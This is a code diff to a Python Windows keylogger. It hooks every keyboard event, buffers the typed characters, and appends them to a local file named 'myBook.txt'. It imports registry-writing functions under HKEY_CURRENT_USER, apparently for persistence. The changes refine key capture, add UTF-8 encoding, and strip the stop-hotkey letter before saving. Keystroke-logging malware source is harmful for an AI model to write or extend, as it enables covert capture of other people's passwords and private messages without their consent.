@@ -6,7 +6,7 @@ import json
 import os
 from os.path import exists
 import sys
-from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, DeleteValue, QueryValueEx
+from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, DeleteValue
 
 # File where the Characters get logged
 file = 'myBook.txt'
@@ -83,7 +83,7 @@ def log_debug():
 # Append file with pressed keys
 def log_local():
     global line_buffer
-    f = open(file, "a")
+    f = open(file, "a", encoding='utf8')
     f.write(line_buffer)
     f.close
     line_buffer = ''
@@ -110,17 +110,15 @@ def key_callback(event):
         log_debug()
         return True
 
+    key_pressed = ''
     # Key Represention
     if event.name == 'space':
         key_pressed = ' '
     elif event.name == 'enter':
         key_pressed = '\n'
     else:
-        key_pressed = event.name
-        if len(key_pressed) == 1:
-            l = 1  # Just for place holder
-        else:
-            return True
+        if len(event.name) == 1:
+            key_pressed = event.name
 
     line_buffer += key_pressed
     
@@ -131,6 +129,8 @@ def main():
     keyboard.hook(key_callback)
     # To Exit the Keylogger with safing the buffer (ctrl + tab + ende)
     keyboard.wait('ctrl+shift+e') 
+    global line_buffer
+    line_buffer = line_buffer.removesuffix("E")
     log_local()
     print("Keylogger stopped.")
     return
